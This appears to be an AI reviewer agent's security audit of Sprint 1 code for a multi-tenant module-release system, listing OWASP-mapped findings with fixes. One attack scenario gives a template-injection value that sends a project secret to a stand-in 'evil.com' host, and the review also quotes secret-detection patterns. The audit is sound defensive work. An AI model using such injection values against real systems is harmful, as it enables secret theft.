# Sprint 1 — Pass 4: Security Review

**Reviewer:** LLD Reviewer Agent (Security Pass — Independent)
**Date:** 2026-03-22
**Scope:** All Sprint 1 implementation files (models, cascade-delete, project-io/module-release/\*, runtime types, trace-event) vs. LLD Section 11 (Security)
**Prior context:** None — independent review with no access to prior pass findings

---

## VERDICT: APPROVED_WITH_RESERVATIONS

Sprint 1 exhibits strong structural security posture. All four new models use the `tenantIsolationPlugin`, indexes are tenantId-prefixed, cross-tenant access returns generic 404-style errors, and the publish safety validator provides genuine defense-in-depth with two-tier secret detection plus source-project identifier scanning. However, several security gaps remain — the most critical being a completely missing validation function for config override injection, a pre-existing cascade delete tenant bypass, and a missing kind guard on soft-delete that could corrupt application projects.

---

## ISSUES

### CRITICAL

#### S4-C1: `validateConfigOverrides` is unimplemented — SSTI vector open

**OWASP:** A03:2021 Injection (Server-Side Template Injection)
**LLD Section:** 11.2
**File:** Not implemented — only exists as pseudocode in LLD spec (lines 1549-1597)
**Verified via:** `grep -r 'validateConfigOverrides' packages/ apps/` returns zero hits in `.ts` source files

The LLD specifies a `validateConfigOverrides` function with five validation layers:

1. Max 50 keys
2. Max 1 KB per value
3. Reject keys not in the contract's `requiredConfigKeys`
4. Reject keys where `isSecret: true`
5. Reject values containing `{{` template syntax (using `/\{\{/` to avoid newline bypass)
6. Reject control characters (`[\x00-\x08\x0B\x0C\x0E-\x1F]`)

**None of these validations exist in the codebase.** The `configOverrides` field on `ProjectModuleDependency` is `Schema.Types.Mixed` with no guard. Any value — including nested objects, template expressions, or binary data — can be persisted.

Attack scenario: A user with `module:import` permission stores `configOverrides: { API_BASE_URL: "http://evil.com/{{secrets.PAYMENT_API_KEY}}" }`. When this value is interpolated into a module tool's HTTP endpoint template at runtime, it exfiltrates the consumer project's secret.

**Impact:** Secret exfiltration via template injection in config overrides. Any user with import permission can extract any secret from the consumer project's variable namespace.
**Fix:** Implement `validateConfigOverrides` exactly as specified in LLD 11.2. Wire it as a blocking pre-save validation in both `POST /api/projects/[id]/module-dependencies` (import) and any update endpoint. The function must be called before persistence, not after.

---

#### S4-C2: `deleteProject` call sites without tenantId bypass new module cascade paths

**OWASP:** A01:2021 Broken Access Control
**File:** `packages/database/src/cascade/cascade-delete.ts:186-189` (signature), `apps/runtime/src/repos/cascade-repo.ts` (call site)

The `deleteProject(projectId, tenantId?)` function makes `tenantId` optional for backward compatibility. When omitted:

```ts
const projectQuery = tenantId ? { _id: projectId, tenantId } : { _id: projectId };
```

The initial project lookup at line 222 uses `{ _id: projectId }` with no tenant scoping. While the `tenantIsolationPlugin` would inject tenant context from ALS if present, code paths that execute outside ALS context (admin scripts, background workers, CLI tools) bypass tenant isolation entirely.

Sprint 1 widened the blast radius: Path A module deletion at line 229 uses `projectTenantId` derived from the unscoped lookup — a potentially wrong tenantId that then feeds into `countDocuments({ tenantId: projectTenantId, moduleProjectId })` and `deleteMany({ tenantId: projectTenantId, moduleProjectId })`. A cross-tenant cascade is theoretically possible.

This is a **pre-existing issue**, but Sprint 1 made it security-relevant by adding tenant-scoped module cascade operations that trust the resolved `projectTenantId`.

**Impact:** Cross-tenant cascade deletion of module entities when deleteProject is called without tenantId and without ALS context.
**Fix:** Either (a) make `tenantId` required in `deleteProject` (breaking change, safest), or (b) throw an error if `tenantId` is not provided AND no ALS tenant context exists. Existing call sites must be audited and updated.

---

### HIGH

#### S4-H1: `softDeleteModuleProject` has no `kind: 'module'` guard — can archive application projects

**OWASP:** A04:2021 Insecure Design
**File:** `packages/database/src/cascade/cascade-delete.ts:366-386`

```ts
export async function softDeleteModuleProject(
  moduleProjectId: string,
  tenantId: string,
  userId: string,
): Promise<{ archivedReleases: number }> {
  await Project.findOneAndUpdate(
    { _id: moduleProjectId, tenantId },
    { $set: { archivedAt: now, archivedBy: userId } },
  );
```

The function name implies it should only operate on module projects, but the query filter does not include `kind: 'module'`. If called with an application project's ID, it will silently archive the application project and set `archivedAt` on it.

While the caller is expected to verify `kind === 'module'` before invoking this function, the function itself provides no defense-in-depth. A route handler that incorrectly routes to the soft-delete path (e.g., via a missing kind check in the controller) could corrupt application projects.

**Impact:** Application project corruption — an archived application project may be filtered out of listings, breaking the user's workspace.
**Fix:** Add `kind: 'module'` to the query filter:

```ts
{ _id: moduleProjectId, tenantId, kind: 'module' }
```

This is a one-line change with zero risk of regression.

---

#### S4-H2: Source hash truncated to 64 bits — insufficient for content-addressable deduplication

**OWASP:** A02:2021 Cryptographic Failures
**File:** `packages/project-io/src/module-release/source-hash.ts:34`
**Also at:** `packages/project-io/src/module-release/build-module-release.ts:161, 177`

```ts
return createHash('sha256').update(canonical).digest('hex').slice(0, 16); // 64 bits
```

SHA-256 truncated to 16 hex characters yields 64 bits. Birthday collision probability reaches 50% at ~2^32 releases. The same truncation is applied to per-agent and per-tool hashes (`build-module-release.ts:161, 177`).

While LLD Decision 2c says the hash is "advisory" for dedup, three factors elevate this:

1. The `sourceHash` is stored on `ModuleRelease` and used for comparing releases
2. Per-agent/tool hashes in the artifact are used for incremental diffing
3. Natural evolution toward enforcement (reject-on-duplicate) would make 64-bit collision a correctness bug

**Impact:** Collision risk for dedup hashes. Currently advisory-only but blocks natural evolution toward content-addressable storage.
**Fix:** Increase to `.slice(0, 32)` (128 bits, 2^64 birthday bound). Cost: 16 additional bytes per hash field, negligible storage impact.

---

#### S4-H3: No decompression size guard specified for runtime snapshot consumption

**OWASP:** A05:2021 Security Misconfiguration
**LLD Section:** 1.5 (size enforcement), 5.1 (runtime consumption)

The LLD specifies build-time validation: `JSON.stringify(payload).length <= 8_388_608` before compression. However, the runtime decompression path (specified in Section 5 and 6.1) does not specify a `maxOutputLength` guard on `zlib.gunzipSync()`.

Build-time validation only protects the happy path. A corrupted snapshot (bit rot, direct DB manipulation by admin tools, or a race condition during gzip) could decompress to an unbounded size, causing OOM on the runtime pod during session bootstrap.

**Impact:** Denial of service via decompression bomb at session bootstrap.
**Fix:** Runtime decompression must use `zlib.gunzipSync(payload, { maxOutputLength: 8_388_608 })`. This is a Node.js 14+ feature. Add to the deployment resolver implementation spec.

---

#### S4-H4: `CascadeDeleteBlockedError.consumerProjectIds` is public — information disclosure risk

**OWASP:** A01:2021 Broken Access Control
**File:** `packages/database/src/cascade/cascade-delete.ts:33`

```ts
public readonly consumerProjectIds: string[];
```

The JSDoc comment warns "Do NOT serialize this to HTTP responses", but the property is `public readonly`. Any route handler catching this error can access `err.consumerProjectIds`, and defensive serialization (`JSON.stringify(err)` or error middleware that enumerates own properties) will include the IDs in HTTP responses or logs.

The IDs of other tenants' projects are not exposed (the query is tenant-scoped), but the IDs of other projects within the same tenant are — and a user with `module:manage` permission on project A should not necessarily learn the IDs of projects B, C, D that depend on A.

**Impact:** Information disclosure of intra-tenant project IDs to users with module management permissions.
**Fix:** Make `consumerProjectIds` private (or use a symbol-keyed property). Expose only `consumerProjectCount` as the public field. If IDs are needed for internal logging, provide a `getConsumerProjectIds()` method with an explicit opt-in.

---

### MEDIUM

#### S4-M1: `tenantId` in DSL artifacts is only a warning, not blocking

**OWASP:** A01:2021 Broken Access Control
**File:** `packages/project-io/src/module-release/module-publish-safety.ts:383-389`

```ts
issues.push({
  severity: 'warning', // Should be 'blocking'
  code: 'SOURCE_TENANT_ID',
  source,
  message: `${source} contains a tenantId reference...`,
});
```

A module release containing a literal `tenantId = "abc-123-..."` in its DSL will be published with just a warning. The tenant ID is sensitive organizational metadata that should not be embedded in portable artifacts shared across projects.

While cross-tenant visibility is prevented by query-level isolation (consumers can only see modules in their own tenant), the tenant ID itself could be used for targeted social engineering or as a stable identifier for correlation attacks.

**Impact:** Tenant identity metadata leakage in published module artifacts.
**Fix:** Elevate `SOURCE_TENANT_ID` to blocking severity, or ensure the `stripVariableNamespaceIds` recursive walker also strips `tenantId` fields from compiled IR before artifact storage.

---

#### S4-M2: `configOverrides` stored as `Schema.Types.Mixed` — type enforcement gap

**OWASP:** A03:2021 Injection
**File:** `packages/database/src/models/project-module-dependency.model.ts:59`

```ts
configOverrides: { type: Schema.Types.Mixed, default: {} },
```

`Schema.Types.Mixed` accepts any JSON structure. The TypeScript interface declares `Record<string, string>`, but MongoDB does not enforce this. A direct MongoDB write (admin tool, migration script, or API bypass) could store nested objects, arrays, or non-string values that downstream template interpolation doesn't expect.

Even after `validateConfigOverrides` is implemented (S4-C1), if the validation only checks string values, a non-string value could bypass it entirely.

**Impact:** Type confusion in config overrides enables potential injection bypass.
**Fix:** Use `{ type: Map, of: String }` instead of `Mixed`, or add an explicit type check in `validateConfigOverrides`: reject any value where `typeof value !== 'string'`.

---

#### S4-M3: `contractSnapshot` is mutable — no immutability enforcement

**OWASP:** A04:2021 Insecure Design
**File:** `packages/database/src/models/project-module-dependency.model.ts:60`

The `contractSnapshot` is a point-in-time copy of the module's contract at import time. It is stored as `Mixed` with no immutability protection. A buggy handler doing a bulk `findOneAndUpdate` could inadvertently overwrite the snapshot, making the dependency's contract diverge from what was actually validated at import time.

**Impact:** Silent contract corruption could hide breaking changes, allowing a dependency to appear satisfiable when its actual requirements have changed.
**Fix:** Add `immutable: true` to the Mongoose schema field: `{ type: Schema.Types.Mixed, required: true, immutable: true }`. This causes Mongoose to silently ignore `$set` operations on the field after creation.

---

#### S4-M4: Test fixture uses `sk-test-123` in configOverrides — misleading secret in non-secret field

**OWASP:** N/A (test quality / security signal)
**File:** `packages/database/src/__tests__/model-project-module-dependency.test.ts:41`

```ts
configOverrides: { API_KEY: 'sk-test-123' },
```

The test fixture stores a value that looks like an API key (`sk-test-123`) in `configOverrides`. This contradicts the security model where `configOverrides` should only contain non-secret literal values. Secret config keys (where `isSecret: true`) must be rejected by `validateConfigOverrides`.

While this is only a test fixture, it sets a confusing precedent and could cause a future contributor to believe storing secrets in `configOverrides` is acceptable.

**Impact:** Misleading test data suggests secrets can be stored in config overrides.
**Fix:** Change the test fixture to use a non-secret value like `{ API_BASE_URL: 'https://api.example.com' }`.

---

#### S4-M5: `setInterval` timer leak in lock renewal pattern — no try/finally mandate

**OWASP:** A05:2021 Security Misconfiguration
**LLD Section:** 10.2 (lock pattern specification)

The LLD's `acquireDeployLock` specification starts a `setInterval` for Redis lock renewal. If the deployment build throws before calling `release()`, the interval timer runs indefinitely. Node.js `setInterval` keeps the event loop alive, preventing graceful shutdown and leaking the Redis lock key.

The LLD does not mandate that callers use `try/finally` with the lock's `release()` function. While this is an obvious pattern for experienced developers, the absence of an explicit requirement in the spec leaves it to implementor discipline.

**Impact:** Timer and Redis key leak on deployment build failures. Prevents graceful pod shutdown.
**Fix:** Add to LLD Section 10.2: "Callers MUST invoke `release()` in a `finally` block." Additionally, the lock implementation should call `renewalTimer.unref()` so leaked timers do not prevent graceful shutdown.

---

### LOW

#### S4-L1: `BASE64_RE` pattern generates false positives on common DSL content

**OWASP:** N/A (false positive risk)
**File:** `packages/project-io/src/module-release/module-publish-safety.ts:55`

```ts
const BASE64_RE = /[A-Za-z0-9+/=]{20,}/g;
```

This regex matches any 20+ character alphanumeric run, which commonly appears in UUIDs, long identifiers, and SHA hashes in DSL content. The `looksLikeEncodedSecret` heuristic mitigates some false positives but still flags legitimate content.

Since this is `warning` severity and does not block publishing, the impact is limited to warning fatigue that could cause publishers to ignore legitimate security warnings.

**Impact:** Warning fatigue reduces trust in the safety validator.
**Fix:** Increase threshold to 32+ chars, or add UUID/SHA exclusion before the `looksLikeEncodedSecret` check.

---

#### S4-L2: `ModuleRelease.compiledIR` typed as `Record<string, unknown>` — no structural validation at read boundary

**OWASP:** A08:2021 Software and Data Integrity Failures
**File:** `packages/database/src/models/module-release.model.ts:59`

The field is intentionally typed as `unknown` to avoid a cross-package compile dependency on `@abl/compiler`. Consumers cast to `AgentIR` without validation. A corrupted or tampered IR would propagate silently into the runtime merge path.

**Impact:** Corrupted IR in a release is not caught until runtime execution fails.
**Fix:** Add Zod-based structural validation at the read boundary where `compiledIR` is cast to `AgentIR` (deployment build service). This is the natural validation point.

---

#### S4-L3: Module-specific trace event types not in `TraceEventType` union

**OWASP:** N/A (observability gap)
**File:** `packages/shared-kernel/src/types/trace-event.ts`

The LLD specifies module-related trace enrichment (provenance fields on existing events) but does not define dedicated module event types like `module_resolve`, `module_merge`, or `module_config_applied`. The current `tool_auth_resolved` type covers auth scope tracing but misses the broader module lifecycle.

**Impact:** Reduced observability for module-specific debugging.
**Fix:** Consider adding module lifecycle event types in a future sprint.

---

## VERIFIED

- [x] **Tenant isolation (all models)** — `ModuleRelease`, `ModuleEnvironmentPointer`, `ProjectModuleDependency`, `DeploymentModuleSnapshot` all apply `tenantIsolationPlugin` (`schema.plugin(tenantIsolationPlugin)`). The plugin auto-injects `tenantId` into all read/write queries via ALS context.
- [x] **Index design** — All indexes use `tenantId` as the leading key. Unique constraints: `(tenantId, moduleProjectId, version)` on releases, `(tenantId, moduleProjectId, environment)` on pointers, `(tenantId, projectId, alias)` on dependencies, `(tenantId, deploymentId)` on snapshots.
- [x] **Cross-tenant access returns 404** — `resolveSelector` returns generic error messages ("not found or archived", "no release promoted") that do not reveal resource existence in other tenants.
- [x] **Soft-delete fields in schema** — `archivedAt` and `archivedBy` are defined in both `project.model.ts` (lines 62-69) and `module-release.model.ts` (lines 83-84), ensuring `findOneAndUpdate({ $set: { archivedAt } })` is not silently dropped by Mongoose `strict: true`.
- [x] **Cascade delete tenant scoping** — `deleteTenant` deletes all 4 new entity types with `{ tenantId }` filter in dependency order (snapshots -> deps -> pointers -> releases). `deleteProject` Path A and Path B both use `tenantId` in their delete queries.
- [x] **Cascade delete consumer blocking** — Path A correctly blocks deletion when `consumerDepCount > 0` with `CascadeDeleteBlockedError`. Consumer ID fetch is limited to 100 documents to prevent unbounded memory.
- [x] **Publish safety: structural validation** — `validateHttpToolAuth` checks AUTH directives for non-templated literals. `checkAuthSensitiveFields` catches auth-sensitive headers. Both emit blocking severity.
- [x] **Publish safety: secret pattern detection** — PEM keys (`PEM_PRIVATE_KEY_RE`), URL-embedded keys (`URL_KEY_RE`), Bearer/Basic/sk-/pk\_ prefixes (`SECRET_PREFIX_RE`) are detected and flagged as blocking.
- [x] **Publish safety: source-project identifiers** — `variableNamespaceIds` (blocking), raw `_id`, `projectId`, `tenantId` (warnings) are all detected by `checkSourceOnlyIdentifiers`.
- [x] **IR namespace stripping** — `stripVariableNamespaceIds` recursively removes `variableNamespaceIds` from compiled IR including nested arrays and objects.
- [x] **Optimistic concurrency** — `ModuleEnvironmentPointer.revision` field enables atomic `findOneAndUpdate` with revision matching for pointer promotion.
- [x] **Module provenance on TraceEvent** — `moduleAlias`, `moduleProjectId`, `moduleReleaseId`, `sourceAgentName` fields added to canonical `TraceEvent` interface.
- [x] **Unique version constraint** — `ModuleRelease` has unique index on `(tenantId, moduleProjectId, version)`. LLD Section 7.5 specifies catching MongoDB error code 11000 (duplicate key) to return 409.
- [x] **LLD template injection regex** — LLD 11.2 correctly uses `/\{\{/` for template syntax rejection, avoiding the newline bypass on `/\{\{.*?\}\}/`.
- [x] **`tool_auth_resolved` in trace union** — Present in `TraceEventType` at `trace-event.ts:28`.
- [x] **Error message safety** — `resolveSelector` error messages are generic ("not found or archived"), not revealing whether the resource exists in another tenant.

---

## NOTES

1. **S4-C1 (`validateConfigOverrides` missing) is the most urgent gap.** Until this function is implemented and wired into the import route handler, the entire `configOverrides` mechanism is an open SSTI surface. This MUST be implemented before any route handler that writes to `ProjectModuleDependency.configOverrides`.

2. **S4-C2 (pre-existing deleteProject tenant bypass) was not introduced by Sprint 1** but Sprint 1 widened its blast radius. The fix should be included in the Sprint 1 scope since the cascade logic was already substantially modified.

3. **S4-H1 (`softDeleteModuleProject` kind guard) is a one-line fix** with zero regression risk. Adding `kind: 'module'` to the query filter prevents accidental archiving of application projects.

4. **Defense-in-depth is strong.** The `tenantIsolationPlugin` provides automatic tenant scoping on all queries for all four new models. Even if route-level checks are missed, the plugin injects tenant filters from ALS context. This significantly reduces the blast radius of individual isolation gaps.

5. **The publish safety validator is impressively thorough** for a Phase 1 implementation. Two-tier validation (structural + pattern-based) with non-portable binding warnings provides genuine defense-in-depth against credential leaks.

6. **Watch during future sprint implementation:**
   - Deployment build service must include both pre-compression size validation AND post-decompression `maxOutputLength` guard.
   - Route handlers must never serialize `CascadeDeleteBlockedError` directly — always extract only the count.
   - `configOverrides` runtime interpolation must escape template syntax even after `validateConfigOverrides` is in place (defense-in-depth).
